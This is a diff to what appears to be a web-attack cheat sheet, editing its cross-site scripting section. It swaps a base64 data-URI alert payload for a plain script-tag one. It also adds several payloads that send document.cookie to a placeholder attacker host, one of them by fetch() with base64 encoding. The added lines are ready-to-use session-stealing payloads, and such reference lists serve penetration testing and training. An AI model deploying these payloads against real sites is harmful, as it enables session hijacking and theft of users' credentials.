@@ -243,7 +243,7 @@ Add execution sink:
 ```
  
 ->  
-`adaa"> <a/href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show</!--`
+`" /><script>alert(1)</script>`
   
 #### Script Tag
   
@@ -292,9 +292,10 @@ https://malwaredecoder.com/
 
 -> Examples
   
-`<script type=“text/javascript”>document.location=“http://ip:port/?cookie=“+document.cookie;</script>`  
-`<script>window.location="http://ip:port/?cookie="+document.cookie;</script>`
-
+`<script type=“text/javascript”>document.location=“http://ip/?cookie=“+document.cookie;</script>`  
+`<script>window.location="http://ip/?cookie="+document.cookie;</script>`
+`<script>document.location="http://ip/?cookie="+document.cookie;</script>`
+`<script>fetch('https://ip/?cookie=' + btoa(document.cookie));</script>`
 ## Type Juggling
 
 https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
